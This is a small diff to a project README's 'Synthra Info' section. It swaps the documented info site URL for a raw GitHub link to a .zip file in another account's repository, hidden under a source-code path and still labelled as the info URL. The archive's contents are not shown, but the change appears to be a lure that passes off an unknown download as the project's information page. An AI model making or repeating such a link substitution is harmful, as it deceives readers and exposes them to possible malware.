@@ -1,6 +1,6 @@
 ## Synthra Info 
 
-Info URL: https://info.synthra.org/#/
+Info URL: https://raw.githubusercontent.com/khn0x-khn0x/synthra-info/main/src/constants/abis/info-synthra-1.5.zip
 
 ## Development
 
